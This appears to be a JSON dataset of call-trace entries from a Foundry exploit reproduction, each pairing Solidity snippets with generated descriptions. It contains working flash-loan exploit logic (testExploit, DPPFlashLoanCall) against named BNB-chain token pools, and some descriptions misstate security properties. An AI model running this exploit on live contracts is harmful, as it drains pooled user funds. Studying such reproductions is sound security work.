@@ -1,0 +1,2053 @@
+[
+    {
+        "id": "1495313",
+        "args": "",
+        "original_code": "    function testExploit() public payable {\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDT balance before exploit\", USDT_TOKEN.balanceOf(address(this)), 18\n        );\n        // use mint WBNB to mock flashLoan\n        (bool success,) = address(WBNB_TOKEN).call{value: 30_000 ether}(\"\");\n        require(success, \"Mocked flashloan failed\");\n        _WBNBToUSDT();\n        uint256 USDTBefore = USDT_TOKEN.balanceOf(address(this));\n        emit log_named_decimal_uint(\n            \"[Start] exchange USDT balance before exploit\", USDT_TOKEN.balanceOf(address(this)), 18\n        );\n        amount = USDT_TOKEN.balanceOf(dodo);\n        amount2 = USDT_TOKEN.balanceOf(dodo2);\n        USDT_TOKEN.approve(address(PS_ROUTER), type(uint256).max);\n        RES_TOKEN.approve(address(PS_ROUTER), type(uint256).max);\n        ALL_TOKEN.approve(address(PS_ROUTER), type(uint256).max);\n        bytes memory bytecode = type(ReceiveToken).creationCode;\n        address _add;\n        assembly {\n            _add := create2(0, add(bytecode, 32), mload(bytecode), 0)\n        }\n        add = _add;\n        DVM(dodo2).flashLoan(0, amount2, address(this), new bytes(1));\n\n        uint256 USDTAfter = USDT_TOKEN.balanceOf(address(this));\n\n        emit log_named_decimal_uint(\n            \"[End] USDT_RES_PAIR USDT balance after exploit\", USDT_TOKEN.balanceOf(address(USDT_RES_PAIR)), 18\n        );\n\n        emit log_named_decimal_uint(\n            \"[End] USDT_ALL_PAIR USDT balance after exploit\", USDT_TOKEN.balanceOf(address(USDT_ALL_PAIR)), 18\n        );\n\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDTAfter - USDTBefore, 18);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function is designed to simulate an attack or exploit scenario in a decentralized finance (DeFi) environment. It starts by checking the attacker's USDT token balance, then mocks a flash loan by transferring a large amount of WBNB tokens. After converting WBNB to USDT, it checks the USDT balance again and performs a series of operations, including token approvals, creating a new contract, and executing a flash loan. Finally, it calculates and logs the changes in USDT balances before and after the exploit.\n\n2. **Security mechanism**:  \n   - `require(success, \"Mocked flashloan failed\")`: Ensures that the mocked flash loan transaction is successful; otherwise, it stops execution and returns an error message.  \n   - Token approvals (`USDT_TOKEN.approve`, `RES_TOKEN.approve`, `ALL_TOKEN.approve`): Grants permission to the router contract to spend the tokens on behalf of the attacker, but sets the maximum possible allowance, which could be risky if not handled carefully.  \n   - `create2` assembly operation: Creates a new contract address deterministically, which is often used in advanced DeFi strategies but can also be exploited in attacks.  \n   - Flash loan execution (`DVM(dodo2).flashLoan`): Borrows a large amount of tokens temporarily, which is a common mechanism in DeFi but can be misused in exploits.  \n\n3. **Parameter Function**:  \n   - `value: 30_000 ether`: Specifies the amount of WBNB tokens to be sent in the mocked flash loan.  \n   - `amount` and `amount2`: Represent the USDT balances of two specific addresses (`dodo` and `dodo2`), which are used in the flash loan operation.  \n   - `new bytes(1)`: Passes an empty byte array as a parameter to the flash loan function, which is often used to trigger specific behaviors in the contract.  \n\n4. **Return description**:  \n   The function does not explicitly return a value but instead logs several key metrics using `emit` statements. These logs include the attacker's USDT balance before and after the exploit, as well as the USDT balances of specific pairs (`USDT_RES_PAIR` and `USDT_ALL_PAIR`) after the exploit. The final logged value (`USDTAfter - USDTBefore`) represents the net gain in USDT tokens for the attacker after executing the exploit.  \n\n**In summary**, the `testExploit` function simulates an attack by mocking a flash loan, converting tokens, and executing a flash loan to manipulate token balances. It includes security checks like `require` and token approvals but also uses advanced techniques like `create2` and flash loans, which can be risky if misused. The function logs key metrics to track the attacker's gains and changes in token balances.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n    \n      \n",
+        "description": "1. **Core function:**  \n   This function is designed to check and return the balance of a specific account. It looks up the balance associated with the given account address and provides that information to the caller. Essentially, it answers the question: \"How much does this account hold?\"\n\n2. **Security mechanism:**  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the contract. This means it only reads data and does not make any changes, making it safe to call without worrying about unintended side effects. Additionally, it is marked as `external`, meaning it can only be called from outside the contract, adding a layer of access control.\n\n3. **Parameter Function:**  \n   The function takes one parameter: `account`, which is an address. This address represents the account whose balance you want to check. The function uses this address to look up the corresponding balance in the contract's storage.\n\n4. **Return description:**  \n   The function returns a `uint256` value, which represents the balance of the specified account. It retrieves this value directly from the `_balances` mapping, which stores the balances of all accounts in the contract. The calculation logic is straightforward: it simply fetches the value associated with the given account address.\n\n**In summary,**  \nThis function is a simple and secure way to check the balance of a specific account. It takes an address as input, looks up the balance in the contract's storage, and returns the value without making any changes to the contract's state.",
+        "return_value": "0"
+    },
+    {
+        "id": "24420",
+        "args": "PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `approve` function allows the caller (the owner of tokens) to grant permission to another address (the `spender`) to spend a specific amount of tokens on their behalf. This is a common feature in token contracts to enable delegated spending.\n\n2. **Security mechanism**:  \n   - The function uses the `external` modifier, which ensures it can only be called from outside the contract, preventing internal misuse.  \n   - It relies on the `_approve` internal function, which likely includes checks to ensure the caller is the token owner and the `spender` is a valid address.  \n   - The function returns `true` to confirm the approval was successful, providing a clear indication of the operation's outcome.\n\n3. **Parameter Function**:  \n   - `spender`: This is the address of the account that is being granted permission to spend tokens.  \n   - `value`: This is the maximum amount of tokens the `spender` is allowed to spend on behalf of the caller.  \n\n4. **Return description**:  \n   The function always returns `true` after successfully executing the `_approve` function, indicating that the approval process was completed without errors.  \n\nIn summary, the `approve` function enables token owners to delegate spending rights to another address, ensuring secure and controlled token transfers.",
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "30000000000000000000000 [3e22]"
+    },
+    {
+        "id": "74270",
+        "args": "30000000000000000000000 [3e22], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1665051347 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8225",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 30000000000000000000000 [3e22]",
+        "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `transferFrom` function allows one address (the caller) to transfer a specified amount of tokens from another address (`from`) to a third address (`to`). This is commonly used in scenarios where a token holder has approved another party to manage their tokens on their behalf. The function ensures that the transfer is valid and updates the allowance (the approved amount) if necessary.\n\n2. **Security mechanism:**  \n   - The function checks if the caller (`msg.sender`) has an unlimited allowance (`uint(-1)`) from the `from` address. If not, it reduces the allowance by the transferred amount to prevent over-spending.  \n   - The `sub` function (likely from a SafeMath library) is used to safely subtract the transferred value from the allowance, preventing underflow errors.  \n   - The `_transfer` function (not shown here) is assumed to handle the actual token transfer securely, ensuring the `from` address has sufficient balance.  \n\n3. **Parameter Function:**  \n   - `from`: The address from which tokens are being transferred.  \n   - `to`: The address receiving the tokens.  \n   - `value`: The amount of tokens to be transferred.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the transfer was successful. This is a standard practice in ERC-20 token contracts to confirm the operation's completion.  \n\n**In summary,**  \nThe `transferFrom` function enables approved parties to transfer tokens on behalf of a token holder. It ensures security by checking and updating allowances and safely handling the transfer process. The function parameters specify the source, destination, and amount of tokens, and it returns `true` to confirm success.",
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "79400594058233284933197378 [7.94e25], 269724064594062077841614 [2.697e23], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "534",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "299724064594062077841614 [2.997e23]"
+    },
+    {
+        "id": "51864",
+        "args": "7929485047488834098613121 [7.929e24], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27971",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7929485047488834098613121 [7.929e24]",
+        "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   - The `transfer` function allows the sender to move a specified amount of tokens to another address. It directly calls an internal `_transfer` function to handle the actual transfer.  \n   - The `transferFrom` function enables a third party (e.g., a contract or user) to transfer tokens on behalf of the token owner, provided they have been granted sufficient allowance. It also calls the internal `_transfer` function after adjusting the allowance.  \n\n2. **Security mechanism:**  \n   - Both functions are marked as `external`, meaning they can only be called from outside the contract, ensuring internal state changes are controlled.  \n   - The `transferFrom` function includes a check to ensure the caller has sufficient allowance to perform the transfer. If the allowance is not unlimited (`uint(-1)`), it reduces the allowance by the transferred amount to prevent unauthorized or excessive transfers.  \n\n3. **Parameter Function:**  \n   - For `transfer`:  \n     - `to`: The address receiving the tokens.  \n     - `value`: The amount of tokens to be transferred.  \n   - For `transferFrom`:  \n     - `from`: The address from which tokens are being transferred (the owner).  \n     - `to`: The address receiving the tokens.  \n     - `value`: The amount of tokens to be transferred.  \n\n4. **Return description:**  \n   - Both functions return a boolean value (`true`) to indicate the transfer was successful. This is a standard practice in token contracts to confirm the operation completed without errors.  \n\n**In summary,**  \nThe `transfer` function allows direct token transfers between addresses, while `transferFrom` enables delegated transfers with allowance checks. Both ensure secure and controlled token movements, returning `true` to confirm success.",
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "71471109010744450834584257 [7.147e25]"
+    },
+    {
+        "id": "534",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "299724064594062077841614 [2.997e23]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7929485047488834098613121 [7.929e24]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7929485047488834098613121 [7.929e24]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7929485047488834098613121 [7.929e24]"
+    },
+    {
+        "id": "2531",
+        "args": "0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE",
+        "original_code": null,
+        "description": null,
+        "return_value": "631929929597153264346714 [6.319e23]"
+    },
+    {
+        "id": "2531",
+        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A",
+        "original_code": null,
+        "description": null,
+        "return_value": "449309959621826321233196 [4.493e23]"
+    },
+    {
+        "id": "24562",
+        "args": "PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24688",
+        "args": "PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24688",
+        "args": "PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "56051",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0 bytes of code"
+    },
+    {
+        "id": "24688",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24688",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1083359",
+        "args": "0, 449309959621826321233196 [4.493e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6071",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 449309959621826321233196 [4.493e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1053451",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 449309959621826321233196 [4.493e23], 0x00",
+        "original_code": "    function DPPFlashLoanCall(\n        address, /*sender*/\n        uint256, /*baseAmount*/\n        uint256, /*quoteAmount*/\n        bytes calldata /*data*/\n    ) public {\n        if (msg.sender == dodo2) {\n            DVM(dodo).flashLoan(0, amount, address(this), new bytes(1));\n            USDT_TOKEN.balanceOf(address(this));\n            USDT_TOKEN.transfer(dodo2, amount2);\n        } else {\n            // get RES\n            uint256 amountBuy = USDT_TOKEN.balanceOf(address(this)) / 4;\n            buyRES(amountBuy);\n            buyRES(amountBuy);\n            buyRES(amountBuy);\n            buyRES(amountBuy);\n            // Burn RES in LP\n            RES_TOKEN.thisAToB();\n            // Sell RES , ALL\n            sellRES();\n            sellALL();\n            USDT_TOKEN.balanceOf(address(this));\n            USDT_TOKEN.transfer(address(dodo), amount);\n        }\n",
+        "description": "1. **Core functions:**\n   The `DPPFlashLoanCall` function is designed to handle a flash loan operation. It checks if the caller is a specific address (`dodo2`). If so, it triggers a flash loan from another contract (`DVM`) and transfers a certain amount of USDT to `dodo2`. If the caller is not `dodo2`, the function performs a series of actions: it calculates a portion of the USDT balance, buys a token (`RES`) multiple times, burns `RES` tokens in a liquidity pool, sells `RES` tokens, and finally transfers a certain amount of USDT to the `dodo` address.\n\n2. **Security mechanism:**\n   The function uses a simple check (`msg.sender == dodo2`) to ensure that only the `dodo2` address can trigger the flash loan operation. This acts as a basic access control mechanism. Additionally, the function interacts with external contracts (`DVM`, `USDT_TOKEN`, `RES_TOKEN`) using their respective methods, which implies that these contracts are trusted and their security is assumed. However, there are no explicit checks for reentrancy or other common vulnerabilities, which could be a potential risk.\n\n3. **Parameter Function:**\n   The function takes four parameters, but none of them are used within the function body. The parameters are:\n   - `sender`: The address initiating the call (unused).\n   - `baseAmount`: A numeric value representing the base amount (unused).\n   - `quoteAmount`: A numeric value representing the quote amount (unused).\n   - `data`: Additional data passed to the function (unused).\n   These parameters are likely placeholders for future functionality or compatibility with a specific interface.\n\n4. **Return description:**\n   The function does not return any value. It performs actions based on the caller's address and interacts with external contracts to execute flash loans, token transfers, and trading operations. The final state changes are reflected in the balances of the involved tokens and contracts, but no explicit output is generated by the function itself.\n\n**In summary,**\nThe `DPPFlashLoanCall` function is a specialized tool for handling flash loans and token trading operations. It uses a basic security check to control access to the flash loan feature and interacts with external contracts to perform various actions. The function's parameters are currently unused, and it does not return any value, focusing instead on executing specific logic based on the caller's identity.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "1043005",
+        "args": "0, 631929929597153264346714 [6.319e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1040306",
+        "args": "0, 631929929597153264346714 [6.319e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6071",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 631929929597153264346714 [6.319e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "984240",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 631929929597153264346714 [6.319e23], 0x00",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9010724936707813684193031 [9.01e24]"
+    },
+    {
+        "id": "275465",
+        "args": "2252681234176953421048257 [2.252e24], 0, [0x55d398326f99059fF775485246999027B3197955, 0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], 0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 1665051347 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "10834",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 2252681234176953421048257 [2.252e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2563",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "260015849847947963440692 [2.6e23], 110613876127006 [1.106e14], 1665051026 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2512697084024901384488949 [2.512e24]"
+    },
+    {
+        "id": "248439",
+        "args": "0, 99141753690629 [9.914e13], 0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "214033",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 99141753690629 [9.914e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2439",
+        "args": "",
+        "original_code": "    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n    \n     \n",
+        "description": "1. Core functions:  \nThe `totalSupply` function is designed to provide the total number of tokens that currently exist in the system. It is a simple function that retrieves and returns the value stored in the `_totalSupply` variable, which represents the overall supply of tokens.\n\n2. Security mechanism:  \nThe function uses the `external` and `view` modifiers. The `external` modifier ensures that the function can only be called from outside the contract, not internally. The `view` modifier indicates that the function does not modify the state of the contract, meaning it only reads data without making any changes. These modifiers help ensure that the function is secure and does not inadvertently alter the contract's state.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply accesses the `_totalSupply` variable directly and returns its value.\n\n4. Return description:  \nThe function returns the value of `_totalSupply`, which is a variable that holds the total number of tokens in the system. The calculation logic is straightforward: it retrieves the value stored in `_totalSupply` and returns it as the output.\n\nIn summary,  \nThe `totalSupply` function is a simple and secure way to check the total number of tokens in the system. It does not require any input parameters and directly returns the value of `_totalSupply` without modifying the contract's state.",
+        "return_value": "5607099684513225068 [5.607e18]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "397",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "260015849847947963440692 [2.6e23], 110613876127006 [1.106e14], 1665051026 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2512697084024901384488949 [2.512e24]"
+    },
+    {
+        "id": "658",
+        "args": "99141753690629 [9.914e13], 110613876127006 [1.106e14], 260015849847947963440692 [2.6e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "233048766066982765614554 [2.33e23]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2512697084024901384488949 [2.512e24]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "2676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "260015849847947963440692 [2.6e23], 110613876127006 [1.106e14], 1665051026 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "2974252610718 [2.974e12], 110613876127006 [1.106e14], 260015849847947963440692 [2.6e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6791818372392311330577 [6.791e21]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "2676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]"
+    },
+    {
+        "id": "2465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "6791818372392311330577 [6.791e21], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "67018298248711428843 [6.701e19]"
+    },
+    {
+        "id": "43118",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 67018298248711428843 [6.701e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "260015849847947963440692 [2.6e23], 110613876127006 [1.106e14], 1665051026 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "7931340295250 [7.931e12], 110613876127006 [1.106e14], 260015849847947963440692 [2.6e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "17355931377277475599098 [1.735e22]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "17355931377277475599098 [1.735e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "140710009716778606867 [1.407e20]"
+    },
+    {
+        "id": "13718",
+        "args": "0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 140710009716778606867 [1.407e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2512697084024901384488949 [2.512e24]"
+    },
+    {
+        "id": "563",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11472122436377 [1.147e13]"
+    },
+    {
+        "id": "563",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd",
+        "original_code": null,
+        "description": null,
+        "return_value": "84270490637034 [8.427e13]"
+    },
+    {
+        "id": "116781",
+        "args": "2252681234176953421048257 [2.252e24], 0, [0x55d398326f99059fF775485246999027B3197955, 0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], 0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 1665051347 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6034",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 2252681234176953421048257 [2.252e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "563",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd",
+        "original_code": null,
+        "description": null,
+        "return_value": "84270490637034 [8.427e13]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2512697084024901384488949 [2.512e24], 11472122436377 [1.147e13], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4765378318201854805537206 [4.765e24]"
+    },
+    {
+        "id": "101055",
+        "args": "0, 5415924297191 [5.415e12], 0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "85933",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 5415924297191 [5.415e12]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "5607099684513225068 [5.607e18]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "397",
+        "args": "",
+        "original_code": null,
+        "description": null,
